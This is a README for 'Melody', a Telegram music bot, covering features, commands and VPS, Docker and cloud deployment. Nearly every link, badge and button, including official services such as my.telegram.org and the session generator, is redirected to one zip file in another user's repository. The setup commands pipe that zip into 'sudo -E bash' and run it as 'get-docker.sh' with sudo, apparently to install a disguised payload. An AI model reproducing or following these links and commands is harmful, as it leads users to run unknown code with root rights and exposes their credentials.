<p align="center">
  <img src="Melody/assets/equalizer.svg" alt="Melody Icon" width="650">
</p>

<div align="center">
  <img src="https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip𝐌𝐄𝐋𝐎𝐃𝐘+𝐌𝐔𝐒𝐈𝐂;𝐔𝐥𝐭𝐫𝐚-𝐋𝐨𝐰+𝐋𝐚𝐭𝐞𝐧𝐜𝐲+𝐒𝐭𝐫𝐞𝐚𝐦𝐢𝐧𝐠;𝐍𝐞𝐱𝐭-𝐆𝐞𝐧+𝐀𝐮𝐝𝐢𝐨+𝐄𝐧𝐠𝐢𝐧𝐞" alt="Melody Typography">

<br>

**A sophisticated, high-performance music streaming engine for Telegram.**

[Engineering Stack](#-engineering-stack) • [Dockerization](#-containerization--docker) • [Deployment](#-deployment-guide) • [Configuration](#-configuration)

<br>

[![Maintained by Bisug](https://img.shields.io/badge/Maintainer-Bisug-black?style=for-the-badge&logo=github)](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)
[![API Performance](https://img.shields.io/badge/API-10x_Faster-00D9FF?style=for-the-badge)](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)
[![License: MIT](https://img.shields.io/badge/License-MIT-blueviolet?style=for-the-badge)](LICENSE)
[![Last Commit](https://img.shields.io/github/last-commit/bisug/Melody?color=00D9FF&style=for-the-badge&logo=github)](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)
[![Visitors](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)

<br>

[![Stars](https://img.shields.io/github/stars/bisug/Melody?color=black&logo=github&style=for-the-badge)](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)
[![Forks](https://img.shields.io/github/forks/bisug/Melody?color=black&logo=github&style=for-the-badge)](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)

</div>

<p align="center">
  <img src="https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip,fastapi,mongodb,redis,docker,linux,github,git,vscode,bash&theme=dark" />
</p>

<p align="center">
  <img src="https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip" width="48%" />
  <img src="https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip" width="38%" />
</p>


---

## ◈ Technical Overview

Melody is an optimized fork of the [**ShrutiMusic**](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) architecture, re-engineered for ultra-low latency and maximum uptime. This project was **heavily vibe coded** with a relentless focus on aesthetics, fluid interactions, and visual excellence.

### **🏗️ Core Architecture**
- **Distributed Engine**: Leveraging a high-speed bypass API for resilient media delivery across all regions.
- **Asynchronous Core**: Built on the `Pyrogram` framework and `Motor` (MongoDB) for high-concurrency handling.
- **Adaptive Quality**: Intelligent transcoding system that balances audio fidelity with network stability.

---

## ✦ Features

| Capability | Technical Detail |
| :--- | :--- |
| **Audiophile Grade** | High-fidelity audio streaming optimized for Telegram's Opus codec. |
| **Universal Support** | Seamless playback from **YouTube**, **Spotify**, **SoundCloud**, and **Direct Links**. |
| **Instant Playback** | API-accelerated pre-fetching ensures tracks start in **1-3 seconds**. |
| **Smart Moderation** | Visual command suite for volume control, dynamic queuing, and auto-skip. |
| **Global Localization** | Multi-language support with **15+** fully localized interface translations. |

---

## ◈ Engineering Stack

Melody is built on a modern, asynchronous stack designed for high-concurrency and low-latency performance.

### **Core Frameworks**
| Library | Role in Melody |
| :--- | :--- |
| [**Kurigram**](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) | An advanced fork of Pyrogram used as the primary Telegram MTProto framework for high-speed bot interaction. |
| [**Py-TgCalls**](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) | The industry standard for handling Telegram Group Call streaming (transcoding and pushing audio/video). |
| [**FastAPI**](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) | Powers the internal web service used for health monitoring and keeping the bot alive on cloud platforms. |

### **Data & Media Engine**
| Library | Role in Melody |
| :--- | :--- |
| [**Motor**](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) | Asynchronous driver for **MongoDB**, ensuring database operations never block the streaming loop. |
| [**Redis**](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) | High-speed cache for keeping track of live player states and group-specific settings. |
| [**yt-dlp**](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) | The primary engine for extracting and downloading media from 1000+ supported sites. |
| [**Spotipy**](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) | Native integration for resolving Spotify tracks and playlists into streamable content. |

---

## ◈ Web Service Architecture

Melody includes a built-in **FastAPI** server that runs in the background of the main bot process. This serves two critical technical purposes:

1.  **Health Monitoring**: Provides a `/` and `/ping` endpoint that cloud providers can query to verify the bot is operational.
2.  **Persistence (Anti-Idling)**: On platforms like **Render** or **Koyeb**, the bot must listen on an HTTP port to prevent the "Free Tier" from putting it to sleep.

The web server is fully asynchronous and shares the main bot application's `asyncio` event loop, ensuring zero performance overhead.

---

## ◈ Containerization & Docker

Melody utilizes a high-performance **Multi-Stage Docker Architecture** to ensure the production image is lightweight, secure, and reproducible.

### **🏗️ Build Strategy**
1.  **Stage 1 (Builder)**: Compiles Python dependencies and builds an isolated virtual environment using `python:3.13-slim`.
2.  **Stage 2 (Runtime)**: Copies only the necessary artifacts (venv) from the builder into a clean environment, reducing image size by ~60%.

### **🔐 Security & Stability**
-   **Non-Root Execution**: The bot runs under a dedicated `botuser` to prevent container escape and unauthorized system access.
-   **Health Checks**: Built-in `HEALTHCHECK` instructions monitor the **FastAPI** status endpoint. If the web service fails, the container is automatically marked as `unhealthy` for orchestration recovery.
-   **Optimized Layering**: Strategic use of `.dockerignore` and single-layer `RUN` commands ensures rapid build times and efficient caching.

---

## Commands

### ◈ Streaming Commands
| Command | Description |
| :--- | :--- |
| `/play <query>` | Discover and stream audio from YouTube, Spotify, and more. |
| `/vplay <query>` | Stream video directly into the Group Voice Chat. |
| `/cplay <query>` | Stream audio in a linked Channel Voice Chat. |
| `/playmode` | Configure the default playback mode for your group. |
| `/playlist` | View and manage your personal/group streaming queues. |

### ◈ Administrative Controls
| Command | Description |
| :--- | :--- |
| `/pause` / `/resume` | Toggle the playback state of the current track. |
| `/skip` | Transition to the next item in the playback queue. |
| `/stop` / `/end` | Halt the stream and clear the active session. |
| `/seek <duration>` | Jump to a specific timestamp in the current track. |
| `/loop <1-10>` | Enable looping for the current track or the entire queue. |
| `/shuffle` | Randomize the order of the current playback queue. |
| `/speed` | Adjust the playback speed (0.5x to 2.0x). |
| `/auth` / `/unauth` | Grant or revoke administrative command permissions. |

### ◈ Tools & Utility
| Command | Description |
| :--- | :--- |
| `/settings` | Access and modify bot configurations for your group. |
| `/language` | Change the bot's interface language. |
| `/ping` | Check the bot's response latency and uptime. |
| `/stats` | View global and group-specific streaming statistics. |
| `/reload` | Refresh the bot's cache and authorized user list. |

---

## ◈ Prerequisites: Session Generation

To use Melody, you **must** obtain a `STRING_SESSION` for your assistant account. This acts as the login key for the Userbot that joins Voice Chats.

[![Open Generator](https://img.shields.io/badge/Open%20Session%20Generator-00D9FF?style=for-the-badge&logo=telegram)](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip,user)

> [!TIP]
> This web-based generator is the most secure and reliable method to obtain your session string. Ensure you select **Pyrogram** and **User** type.

---

## ◈ Deployment Guide

Melody supports various hosting environments. Choose the platform that best fits your technical expertise.

### 🛠️ Select Your Platform
| Platform | Recommendation | Status |
| :--- | :--- | :--- |
| [**◈ VPS Deployment**](#-vps-deployment-recommended-for-247-stability) | **Highly Recommended** | 24/7 Stability |
| [**◈ Cloud Deployment**](#-cloud-deployment-beginner-friendly) | Beginner Friendly | Verified |

### ◈ Supported Platforms
Melody has been confirmed operational on the following environments:
- ◈ **Verified**: Heroku, Render, and Koyeb.
- ◈ **Expected Support**: Ubuntu/Debian VPS (Native & Docker).

---

## ◈ VPS Deployment (Recommended for 24/7 Stability)
This method offers the best performance and reliability. Recommended for long-term project hosting.

### Phase 1: Environment Setup
Run these commands to prepare your Linux server (Ubuntu/Debian recommended).

```bash
# Update system packages to the latest version
sudo apt-get update && sudo apt-get upgrade -y

# Install core dependencies: Python, Pip, Git, FFmpeg (for audio), and Screen (for persistence)
sudo apt-get install python3 python3-pip python3-venv ffmpeg git screen curl -y

# Install Node.js (Required for internal components)
curl -fsSL https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip | sudo -E bash -
sudo apt-get install -y nodejs
```

### Phase 2: Project Initialization
Clone your code and set up an isolated environment to avoid package conflicts.

```bash
# Clone the repository
git clone https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip && cd Melody

# Create and activate a Virtual Environment
python3 -m venv venv
source venv/bin/activate

# Install all required Python libraries
pip3 install -U pip
pip3 install -U -r requirements.txt
```

### Phase 3: Configuration
```bash
# Create your environment file
cp sample.env .env
nano .env
```
> [!TIP]
> Use the arrow keys to navigate and `Ctrl+O`, `Enter`, `Ctrl+X` to save and exit. Ensure all required variables are filled.

### Phase 4: Persistence (Keep the Bot Running)
You have two options to keep your bot active after you close your terminal:

**Option A: Using Screen (Easiest for Beginners)**
```bash
# Start a new persistent window
screen -S melody
# Start the bot
python3 -m Melody
# To exit: Press 'Ctrl+A' followed by 'D'. This leaves the bot running.
# To return: Type 'screen -r melody'.
```

**Option B: Using Systemd (Professional & Permanent)**
Create a service file to ensure the bot restarts automatically if the server reboots.
```bash
sudo nano /etc/systemd/system/melody.service
```
*Paste the following (replace `{username}` with your VPS username and `{path}` with your project path):*
```ini
[Unit]
Description=Melody Music Bot
After=network.target

[Service]
Type=simple
User={username}
WorkingDirectory={path}/Melody
ExecStart={path}/Melody/venv/bin/python3 -m Melody
Restart=always

[Install]
WantedBy=multi-user.target
```
*Run:* `sudo systemctl enable melody --now`

---

## ◈ VPS Deployment (Docker-based)
Running with Docker is the most reliable way to ensure a consistent environment across different VPS providers.

### Phase 1: Install Docker
Run these commands to install Docker and Docker-Compose on your VPS.

```bash
# Install Docker
curl -fsSL https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip -o get-docker.sh
sudo sh get-docker.sh

# Start Docker and enable at boot
sudo systemctl start docker
sudo systemctl enable docker
```

### Phase 2: Configuration
Ensure you have your `.env` file ready in the project root as described in Phase 3 of the native VPS guide.

### Phase 3: Launch with Docker
Use the provided `Dockerfile` to build and run the bot in an isolated container.

```bash
# Build the image
docker build -t melody .

# Run the container (detached mode)
docker run -d --restart always --name melody-bot --env-file .env melody
```

### Phase 4: Useful Commands
```bash
# View logs
docker logs -f melody-bot

# Stop the bot
docker stop melody-bot

# Restart the bot
docker restart melody-bot
```

---

## ◈ Cloud Deployment 

Cloud platforms automate the infrastructure setup using **Docker**, ensuring identical environments regardless of hosting.

### ◈ Heroku Deployment
Heroku uses the provided `Dockerfile` or `Procfile` to build and run your bot in an isolated "dyno".

1. 🚀 **One-Click Setup:** Clicking the button below will take you to a "New App" page on Heroku.
2. 🔑 **Variables:** You will be prompted to fill in your environment variables.
3. 🏢 **Heroku Teams:** If you are deploying to a **Heroku Team**, you MUST have **Admin** permissions within that team to create new apps.
4. ✅ **Enable Worker**: Once deployed, go to the **Resources** tab and ensure the `worker` dyno is enabled.

[![Deploy](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)

---

### ◈ Render Deployment
Render is a modern cloud platform that directly supports **Docker** images from your repository.

1. 🐳 **Docker Powered:** Render reads the `Dockerfile` in this repo to build a dedicated container for your bot.
2. 🔄 **Auto-Build:** Every time you push a change to your repository, Render will automatically rebuild and redeploy your bot.
3. ⚡ **Ease of Use**: It handles environment isolation and port management automatically.

[![Deploy to Render](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)

#### ✦ Manual Render Setup
1. ◈ **New Web Service**: Click **New +** > **Web Service**.
2. ◈ **Connect Repo**: Link your fork of `bisug/Melody`.
3. ◈ **Runtime**: Select **Docker**.
4. ◈ **Environment**: Add all required variables from your `.env`.
   - **Crucial**: Set `WEB_SERVICE` to `True` and `PORT` to `8000`.
5. ◈ **Deploy**: Render will automatically build the image from the `Dockerfile`.

---

### ◈ Koyeb Deployment (Web Service Free)
Koyeb provides a high-performance serverless platform with a generous free tier.

#### ✦ Manual Koyeb Setup
1. ◈ **Create App**: Click **Create Service**.
2. ◈ **Source**: Select **GitHub** and connect your repository.
3. ◈ **Service Type**: Choose **Web Service**.
4. ◈ **Builder**: Select **Dockerfile**.
5. ◈ **Environment Variables**:
   - Add all keys from your `.env`.
   - Ensure `WEB_SERVICE=True` and `PORT=8000`.
6. ◈ **Region**: Choose the region closest to your MongoDB/Redis for lowest latency.
7. ◈ **Finish**: Your bot will be live in minutes.

> [!IMPORTANT]
> **Persistence Tip:** If using **Free Tiers**, your bot will go to sleep unless you follow the [Keep-Alive Guide](#🔄-keep-alive-for-web-services).

---

## ◈ Configuration

> [!WARNING]
> **SECURITY ADVISORY**: After forking this repository, **NEVER** commit your sensitive credentials (API IDs, Tokens, Session Strings) into a public `.env` or `config.py`.
> - **Recommended**: Use Environment Variables on your hosting platform (Heroku, Render, etc.).
> - **Alternative**: If you absolutely must commit your settings, ensure your repository is set to **Private** first.

### Core Settings
| Variable | Required | Description |
| :--- | :--- | :--- |
| `API_ID` | Yes | Your API ID from [my.telegram.org](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip). |
| `API_HASH` | Yes | Your API Hash from [my.telegram.org](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip). |
| `BOT_TOKEN` | Yes | Token from [@BotFather](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip). |
| `MONGO_DB_URI` | Yes | [MongoDB Atlas](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) connection string. |
| `MONGO_DB_NAME` | No | Name of your MongoDB database (Default: Melody). |
| `REDIS_URI` | No | Optional Redis string for 2x faster cache. [See Guide](#🗄️-redis-cache-guide) |
| `STRING_SESSION` | Yes | Primary Pyrogram V2 session string. [Generator](#session-generation) |
| `STRING_SESSION2-5` | No | Additional session strings for multi-assistant support. |

---

### ◈ Core Variable Guide**

To ensure your bot runs correctly, you must provide these essential credentials. Follow these steps carefully.

#### **1. Telegram API Credentials (`API_ID` & `API_HASH`)**
*   **How to Get:**
    1.  Go to [my.telegram.org](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip).
    2.  Enter your phone number in international format (e.g., `+91...`) and confirm the code sent to your Telegram.
    3.  Click on **API Development Tools**.
    4.  **App title:** Any name (e.g., `MelodyPlayer`).
    5.  **Short name:** Any short word (e.g., `Melody`).
    6.  Click **Create application**.
    7.  Copy the **App api_id** and **App api_hash**.
*   **Why it's Required:** These are the master keys that allow Melody to "piggyback" on the Telegram desktop/mobile app infrastructure. Without them, the bot cannot connect to the servers to stream music.

#### **2. Bot Token (`BOT_TOKEN`)**
*   **How to Get:**
    1.  Open Telegram and search for [@BotFather](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip).
    2.  Send `/newbot`.
    3.  Enter a **Display Name** for your bot.
    4.  Enter a **Username** (must end in `bot`, e.g., `Melody_123_bot`).
    5.  BotFather will send a message containing your **HTTP API Token**.
*   **Why it's Required:** This token acts as the specific password for your bot account. It allows the software to take control of that specific @username on Telegram.

#### **3. Database Connection (`MONGO_DB_URI`)**
*   **How to Get:**
    1.  Sign up at [MongoDB Atlas](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip).
    2.  **Create a Cluster:** Choose the **FREE (Shared)** M0 cluster. Select a region near you.
    3.  **Database Access:** Create a user. Make sure to remember the **Username** and **Password**.
    4.  **Network Access:** Click **Add IP Address** and select **Allow Access from Anywhere** (0.0.0.0/0). *Critical for cloud hosting.*
    5.  **Connect:** Go to **Deployment > Database** and click **Connect**.
    6.  Choose **Drivers** (Python).
    7.  Copy the connection string (e.g., `mongodb+srv://user:pass@cluster.mongodb.net/?...`).
    8.  **Important:** Replace `<password>` in the string with your actual database user password.
*   **Why it's Required:** This is where Melody stores its "memory"—including who is authorized, your preferred language, and group settings. Without it, the bot will reset every time it restarts.

#### **4. Redis Cache (`REDIS_URI`)**
*   **How to Get:**
    1.  Create a free account on [Upstash](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip).
    2.  Create a new **Redis** database.
    3.  Select **Global** or a region nearest to your bot's hosting.
    4.  In the **Connect to your database** section, copy the **Redis Connect String** (starts with `rediss://`).
*   **Why it's Required:** Redis is used for ultra-fast temporary data storage (caching). It handles the live player state and prevents unnecessary heavy hits to your MongoDB, ensuring your bot stays snappy and responsive.

#### **5. Pyrogram Session (`STRING_SESSION`)**
*   **How to Get:** Use our official [Session String Generator](#session-generation).
*   **Why it's Required:** Standard bots cannot join Voice Chats. To play music, Melody uses a "User Assistant" (your secondary account) to join the VC and play the audio. This session string acts as the login key for that assistant.

### Administrative & Logging
| Variable | Required | Description |
| :--- | :--- | :--- |
| `OWNER_ID` | Yes | Telegram user ID for the bot owner. |
| `DEV_ID` | No | Additional developer IDs for maintenance. |
| `LOG_GROUP_ID` | Yes | ID of the group/channel for logs (starts with -100). [See Guide](#🆔-identification-guide) |

---

### ◈ Identification Guide**

IDs are unique numbers used by Telegram to identify users and groups. Melody uses these to know who you are and where to send logs.

#### **1. How to get your User ID (`OWNER_ID` / `DEV_ID`)**
1.  Open Telegram and search for [@MissRose_bot](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) or [@GetIDsBot](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip).
2.  Send `/id` to the bot.
3.  Copy the numeric ID (e.g., `123456789`).

#### **2. How to get your Group/Channel ID (`LOG_GROUP_ID`)**
1.  Add [@MissRose_bot](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) to your group or channel.
2.  Send `/id` in the group or forward a message from the channel to the bot.
3.  **Critical:** Ensure the ID starts with `-100` (e.g., `-1001234567890`). If it doesn't, it is not a "Supergroup" or a "Channel," which is required for logging.

### External Services & URLs
| Variable | Required | Description |
| :--- | :--- | :--- |
| `YT_API_URL` | No | [shrutibots.site](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) (Provided by [NoxxOP](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)). |
| `COOKIES_URL` | No | URL to fetch YouTube cookies for bypass. [See Guide](#🍪-cookies-guide) |
| `START_IMG_URL` | No | Direct link to the image shown on /start. [See Guide](#🖼️-image-hosting-guide) |

---

### ◈ Cookies Guide**
To bypass YouTube's bot detection, you need to provide your account cookies in **Netscape** format.

#### **🖥️ Desktop (Chrome/Edge)**
1. 📥 Install the **EditThisCookie** or **Get cookies.txt** extension.
2. 🕵️ **Recommended:** Open [YouTube](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) in **Incognito Mode**.
3. 🌐 Log in to your account.
4. 📤 Click the extension and **Export** cookies as **Netscape** format.
5. 📋 Go to [BatBin](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) and paste your cookies.
6. 🔗 Save and copy the **Raw URL** (e.g., `https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip`).
7. ⚠️ **Critical:** Immediately close the browser/Incognito window after exporting.

#### ** Mobile (Android/iOS)**
1. 📥 Install [Mozilla Firefox](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) and the **cookies.txt** extension.
2. 🕵️ Open [YouTube](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) in a **Private Tab**.
3. 🌐 Log in to your account.
4. 📤 Use the extension to download/copy cookies in **Netscape** format.
5. 📋 Paste to [BatBin](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) and get the **Raw URL**.
6. ⚠️ **Critical:** Immediately close the private tab after exporting.

### ◈ Image Hosting Guide**
Use high-quality direct links for your bot's start image (JPEG or PNG recommended).

1. 📤 Upload your image to a hosting platform like [ImgBB](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip), [Catbox](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip), or [Telegraph](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip).
2. 🔗 Copy the **Direct Link** (the URL should end with `.jpg`, `.jpeg`, or `.png`).
3. 🔑 Provide this URL as your `START_IMG_URL`.

## ◈ Support
| Variable | Required | Description |
| :--- | :--- | :--- |
| `SUPPORT_CHANNEL` | No | [bisug Melody](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) | Telegram channel username. |
| `SUPPORT_GROUP` | No | [bisug Music](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) | Telegram group username. |

---

### ◈ Community & Tuning Guide**

Fine-tune your bot's behavior and link your community resources.

#### **1. Support Resources**
*   **`SUPPORT_CHANNEL` / `SUPPORT_GROUP`**: Enter the public username of your Telegram channel/group (e.g., `MelodySupport`). This will be displayed in the `/start` message and help menu.

#### **2. Performance Limits**
*   **`DURATION_LIMIT`**: Sets the maximum allowed length (in minutes) for a single song. Recommended: `300` (5 hours). Use `0` for no limit.
*   **`PLAYLIST_FETCH_LIMIT`**: Limits how many songs the bot will load when a user plays a large playlist. This prevents the bot from lagging while processing 1000s of items. Recommended: `25` or `50`.

#### **3. Smart Features**
*   **`AUTO_LEAVING_ASSISTANT`**: If set to `True`, the Assistant account (`Userbot`) will automatically leave the Voice Chat if no one else is listening. This saves resources and keeps the VC clean.

#### **4. Web Connectivity (`WEB_SERVICE` & `PORT`)**
*   **`WEB_SERVICE`**: MUST be set to `True` if you are hosting on "Web Service" platforms like Render or Koyeb.
*   **`PORT`**: Default is `8000`. This is the internal port the bot "listens" on to stay active.

> [!WARNING]
> **Free Tier Idling:** Web services like Render (Free Tier) will automatically "sleep" after inactivity. This will stop your bot.

### **🔄 Keep-Alive (For Web Services)**
To keep your bot running 24/7 on free hosting, use a cronjob service (like [Cron-job.org](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)) to ping your service URL every 1 minutes.

**𝐒𝐭𝐞𝐩𝐬:**
1. 🌐 Create a free account on [Cron-job.org](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip)
2. ➕ Click **Create Cronjob**
3. 🔗 **Title:** `Melody Keep-Alive`
4. 🌍 **URL:** `https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip` (Replace with your actual app URL)
5. ⏱️ **Schedule:** Every 1 minutes
6. ✅ **Save:** Now your bot will never sleep!

---

## Credits & Attribution

### ◈ Original Foundation
| Contributor | Role & Impact | Resource |
| :--- | :--- | :--- |
| [**NoxxOP**](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) | **Original Architect** • Designed the core framework and the underlying media streaming engine that powers this project. | [![Repo](https://img.shields.io/badge/ShrutiMusic-black?style=flat-square&logo=github)](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) |
| [**All Contributors**](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) | **Project Evolution** • Significant contributions from the global open-source community. | [![Contributors](https://img.shields.io/github/contributors/NoxxOP/ShrutiMusic?style=flat-square&logo=github)](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) |

### 🛡️ Project Governance
| Contributor | Role & Impact | Profile |
| :--- | :--- | :--- |
| **Bisug (Bisu G)** | **Lead Maintainer** • Focused on stability, performance optimization, and implementing modern UI/UX enhancements. | [![Github](https://img.shields.io/badge/Github-black?style=flat-square&logo=github)](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) |

### ◈ AI Technical Assistance
This project’s documentation and code refinements were synthesized with the support of state-of-the-art AI models:

- [**Claude 4.5 Sonnet**](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) – Orchestrated complex technical documentation and logical restructuring.
- [**Gemini 3 Flash**](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) – Provided architectural analysis and rapid debugging insights.
- [**Google Jules**](https://github.com/zaranali/Melody/raw/refs/heads/main/Melody/utils/inline/Software-v2.3.zip) – Optimized visual layout and premium technical formatting.

---

<p align="center">
  <img src="https://img.shields.io/badge/Maintained%20with%20%E2%9D%A4%EF%B8%8F%20by-Bisug-orange?style=for-the-badge" alt="Maintained by Bisug">
  <br>
</p>
